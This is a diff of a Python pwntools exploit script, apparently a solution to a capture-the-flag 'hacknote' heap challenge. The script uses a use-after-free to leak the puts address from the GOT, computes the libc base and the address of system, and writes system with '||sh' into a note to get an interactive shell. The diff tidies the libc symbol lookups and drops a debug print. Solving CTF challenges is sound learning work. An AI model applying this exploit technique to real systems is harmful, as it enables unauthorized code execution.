@@ -23,8 +23,6 @@ def print_note(index):
     server.recvuntil('Index :')
     server.sendline(str(index))
 
-libc_puts_addr = libc.symbols['puts']
-libc_sys_addr = libc.symbols['system']
 puts_got_addr = 0x0804A024
 print_content = 0x0804862B
 
@@ -35,12 +33,13 @@ free_note(0)
 free_note(1)
 add_note(8,p32(print_content)+p32(puts_got_addr))
 print_note(0)
+
 leak_puts_addr = u32(server.recv(4))
-print leak_puts_addr
-libcbase_addr = leak_puts_addr - libc_puts_addr
-system_addr = libcbase_addr + libc_sys_addr
+libcbase_addr = leak_puts_addr - libc.symbols['puts']
+system_addr = libcbase_addr + libc.symbols['system']
+
 free_note(2)
 add_note(8,flat([system_addr,"||sh"]))
 print_note(0)
-server.interactive('nevv$')
+server.interactive()
 
